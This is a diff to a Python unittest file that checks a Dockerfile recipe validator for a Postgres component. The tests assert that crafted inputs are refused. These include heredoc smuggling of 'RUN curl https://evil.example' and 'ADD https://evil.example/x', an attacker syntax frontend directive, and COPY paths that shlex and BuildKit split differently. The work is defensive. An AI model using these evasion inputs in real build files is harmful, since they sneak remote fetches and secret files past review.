@@ -565,8 +565,9 @@ class PostgresComponentTests(unittest.TestCase):
         self.assert_recipes_refused("character", [("", "RUN echo a \\\r\n  && echo b\r\n"), ("", "USER 0\r")])
 
     def test_non_utf8_recipe_is_refused(self) -> None:
-        (self.runtime / "Dockerfile").write_bytes(b"# \xff\n")
-        with self.assertRaises(ValueError):
+        path = self.runtime / "Dockerfile"
+        path.write_bytes((ROOT / "infra/images/postgres/Dockerfile").read_bytes() + b"# \xff\n")
+        with self.assertRaisesRegex(ValueError, "can't decode byte 0xff"):
             component.validate_recipe(self.root)
 
     def test_heredocs_are_refused_because_their_bodies_are_not_instructions(self) -> None:
@@ -575,10 +576,24 @@ class PostgresComponentTests(unittest.TestCase):
             ("", "RUN <<-USER\n\tRUN curl https://evil.example\n\tUSER\n"),
             ("", "RUN cat << USER\nUSER 0\nUSER\n"),
             ("", "RUN 3<<USER\nUSER\n"),
+            ("", "run <<USER\nRUN curl https://evil.example\nUSER\n"),
             ("", "RUN <<'E\\'\nRUN true \\\nE\\\nADD https://evil.example/x /x\n"),
             ("", "RUN <<'E \\'\nRUN true \\\nE \\\nADD https://evil.example/x /x\n"),
             ("", "RUN cat <<USER \\\n  && echo tail\nUSER\n"),
         ])
+
+    def test_copy_words_that_shlex_and_buildkit_split_differently_are_refused(self) -> None:
+        source = "infra/images/postgres/pg_hba.duora.conf"
+        self.assert_recipes_refused("plain words", [
+            ("", f"COPY {source} backend/segredo\\ /d\n"),
+            ("", f"copy {source} backend/segredo\\ /d\n"),
+            ("", f"COPY --chmod=644 {source} backend/segredo\\ /d\n"),
+            ("", f'COPY "{source}" /d\n'),
+            ("", f'COPY ["{source}", "/d"]\n'),
+            ("", f'COPY "--chmod=644" {source} /d\n'),
+            ("", f"COPY --chmod=644 {source} /d\\ir\n"),
+        ])
+        self.assert_recipes_refused("closing quotation", [("", f"COPY {source} 'backend/segredo /d\n")])
 
     def test_alternative_syntax_directive_forms_are_refused(self) -> None:
         self.assert_recipes_refused("instruction", [("// syntax=attacker/frontend\n", "")])
